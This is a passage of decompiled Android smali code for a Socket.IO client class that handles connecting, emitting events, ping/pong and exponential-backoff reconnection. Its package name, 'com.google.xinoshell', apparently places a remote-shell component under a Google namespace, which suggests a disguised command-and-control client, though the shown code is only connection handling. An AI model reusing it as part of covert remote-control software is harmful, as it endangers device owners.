    .line 197
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected:Z

    .line 198
    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnecting:Z

    .line 199
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    invoke-virtual {v0}, Lio/socket/client/Socket;->disconnect()Lio/socket/client/Socket;

    .line 200
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    invoke-virtual {v0}, Lio/socket/client/Socket;->off()Lio/socket/emitter/Emitter;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 202
    .end local p0    # "this":Lcom/google/xinoshell/connection/SocketIOClient;
    :cond_0
    monitor-exit p0

    return-void

    .line 195
    :catchall_0
    move-exception v0

    :try_start_1
    monitor-exit p0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    throw v0
.end method

.method public emit(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p1, "event"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;

    .line 236
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mContext:Landroid/content/Context;

    invoke-static {v0}, Lcom/google/xinoshell/utils/NetworkUtil;->isNetworkConnected(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 237
    invoke-virtual {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->connect()V

    .line 238
    return-void

    .line 241
    :cond_0
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    if-eqz v0, :cond_1

    .line 242
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    filled-new-array {p2}, [Ljava/lang/Object;

    move-result-object v1

    invoke-virtual {v0, p1, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0

    .line 244
    :cond_1
    invoke-virtual {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->connect()V

    .line 246
    :goto_0
    return-void
.end method

.method public emit(Ljava/lang/String;Lorg/json/JSONObject;)V
    .locals 2
    .param p1, "event"    # Ljava/lang/String;
    .param p2, "data"    # Lorg/json/JSONObject;

    .line 223
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mContext:Landroid/content/Context;

    invoke-static {v0}, Lcom/google/xinoshell/utils/NetworkUtil;->isNetworkConnected(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 224
    invoke-virtual {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->connect()V

    .line 225
    return-void

    .line 228
    :cond_0
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    if-eqz v0, :cond_1

    .line 229
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    filled-new-array {p2}, [Ljava/lang/Object;

    move-result-object v1

    invoke-virtual {v0, p1, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0

    .line 231
    :cond_1
    invoke-virtual {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->connect()V

    .line 233
    :goto_0
    return-void
.end method

.method public isConnected()Z
    .locals 1

    .line 219
    iget-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected:Z

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mContext:Landroid/content/Context;

    invoke-static {v0}, Lcom/google/xinoshell/utils/NetworkUtil;->isNetworkConnected(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method synthetic lambda$connect$0$com-google-xinoshell-connection-SocketIOClient()V
    .locals 1

    .line 187
    iget-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected:Z

    if-nez v0, :cond_0

    .line 188
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnecting:Z

    .line 189
    invoke-direct {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->scheduleReconnection()V

    .line 191
    :cond_0
    return-void
.end method

.method synthetic lambda$new$2$com-google-xinoshell-connection-SocketIOClient([Ljava/lang/Object;)V
    .locals 3
    .param p1, "args"    # [Ljava/lang/Object;

    .line 265
    const-wide/16 v0, 0x1388

    iput-wide v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mReconnectDelay:J

    .line 266
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected:Z

    .line 267
    const/4 v1, 0x0

    iput-boolean v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnecting:Z

    .line 268
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    if-eqz v1, :cond_0

    .line 269
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    const-string v2, "connect"

    invoke-interface {v1, v2, p1}, Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;->onEventReceived(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 270
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    invoke-interface {v1, v0}, Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;->onConnectionStateChanged(Z)V

    .line 272
    :cond_0
    return-void
.end method

.method synthetic lambda$new$3$com-google-xinoshell-connection-SocketIOClient([Ljava/lang/Object;)V
    .locals 3
    .param p1, "args"    # [Ljava/lang/Object;

    .line 275
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected:Z

    .line 276
    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnecting:Z

    .line 277
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    if-eqz v1, :cond_0

    .line 278
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    const-string v2, "disconnect"

    invoke-interface {v1, v2, p1}, Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;->onEventReceived(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 279
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    invoke-interface {v1, v0}, Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;->onConnectionStateChanged(Z)V

    .line 281
    :cond_0
    invoke-direct {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->scheduleReconnection()V

    .line 282
    return-void
.end method

.method synthetic lambda$new$4$com-google-xinoshell-connection-SocketIOClient([Ljava/lang/Object;)V
    .locals 3
    .param p1, "args"    # [Ljava/lang/Object;

    .line 285
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected:Z

    .line 286
    iput-boolean v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->isConnecting:Z

    .line 288
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    if-eqz v1, :cond_0

    .line 289
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    const-string v2, "connect_error"

    invoke-interface {v1, v2, p1}, Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;->onEventReceived(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 290
    iget-object v1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    invoke-interface {v1, v0}, Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;->onConnectionStateChanged(Z)V

    .line 292
    :cond_0
    invoke-direct {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->scheduleReconnection()V

    .line 293
    return-void
.end method

.method synthetic lambda$new$5$com-google-xinoshell-connection-SocketIOClient([Ljava/lang/Object;)V
    .locals 2
    .param p1, "args"    # [Ljava/lang/Object;

    .line 294
    const-string v0, "pong"

    const-string v1, ""

    invoke-virtual {p0, v0, v1}, Lcom/google/xinoshell/connection/SocketIOClient;->emit(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method synthetic lambda$scheduleReconnection$1$com-google-xinoshell-connection-SocketIOClient()V
    .locals 4

    .line 212
    invoke-virtual {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->connect()V

    .line 213
    iget-wide v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mReconnectDelay:J

    const-wide/16 v2, 0x2

    mul-long/2addr v0, v2

    const-wide/32 v2, 0xea60

    invoke-static {v0, v1, v2, v3}, Ljava/lang/Math;->min(JJ)J

    move-result-wide v0

    iput-wide v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mReconnectDelay:J

    .line 214
    return-void
.end method

.method public off(Ljava/lang/String;)V
    .locals 1
    .param p1, "event"    # Ljava/lang/String;

    .line 255
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    if-eqz v0, :cond_0

    .line 256
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    invoke-virtual {v0, p1}, Lio/socket/client/Socket;->off(Ljava/lang/String;)Lio/socket/emitter/Emitter;

    .line 258
    :cond_0
    return-void
.end method

.method public on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)V
    .locals 1
    .param p1, "event"    # Ljava/lang/String;
    .param p2, "listener"    # Lio/socket/emitter/Emitter$Listener;

    .line 249
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    if-eqz v0, :cond_0

    .line 250
    iget-object v0, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mSocket:Lio/socket/client/Socket;

    invoke-virtual {v0, p1, p2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 252
    :cond_0
    return-void
.end method

.method public reconnect()V
    .locals 0

    .line 205
    invoke-virtual {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->disconnect()V

    .line 206
    invoke-virtual {p0}, Lcom/google/xinoshell/connection/SocketIOClient;->connect()V

    .line 207
    return-void
.end method

.method public setEventListener(Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;)V
    .locals 0
    .param p1, "listener"    # Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    .line 261
    iput-object p1, p0, Lcom/google/xinoshell/connection/SocketIOClient;->mEventListener:Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;

    .line 262
    return-void
.end method
